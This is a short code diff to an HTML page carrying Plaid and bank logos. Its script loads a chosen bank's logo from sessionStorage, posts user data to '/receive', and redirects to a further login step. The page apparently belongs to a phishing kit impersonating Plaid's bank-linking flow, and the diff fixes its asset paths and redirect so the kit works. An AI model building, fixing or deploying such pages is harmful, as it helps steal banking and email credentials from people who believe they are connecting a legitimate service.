@@ -137,12 +137,12 @@
     </style>
 </head>
 <body>
-    <div style="position: absolute"><img src="assets/images/plaidflat.png" style="width:80px; height:auto;" alt="png"/></div>
+    <div style="position: absolute"><img src="/assets/images/PLAIDFLAT.png" style="width:80px; height:auto;" alt="png"/></div>
     <div class="container">
         <div style="display: flex;">
             <div class="images">
-                <img id="image1" src="assets/images/PLAID.png" alt="Image 1">
-                <img id="image2" src="GLE.png" alt="Image 2">
+                <img id="image1" src="/assets/images/PLAID.png" alt="Image 1">
+                <img id="image2" src="/assets/images/GLE.png" alt="Image 2">
             </div>
         </div>
         <div>
@@ -171,7 +171,7 @@
         var logo = document.querySelector('#image2');
         var passedLogo = sessionStorage.getItem('chosenbank');
         if(passedLogo){
-            logo.src = "assets/images/"+ passedLogo + '.png';
+            logo.src = `/assets/images/${passedLogo.toUpperCase()}.png`;
         } else {
             console.log('lie');
         }
@@ -222,10 +222,8 @@
                 url: "/receive",
                 data: user
             }).done(function(msg) {
-                // Store visitor info in sessionStorage
-                sessionStorage.setItem('visitor', visitor);
                 console.log(msg);
-                window.location.href = "/login/email";
+                window.location.href = "/link?step=3";
                 console.log(msg); // Log success message
             }).fail(function(err, textstatus, error) {
             //window.location.href = "login/2"; 
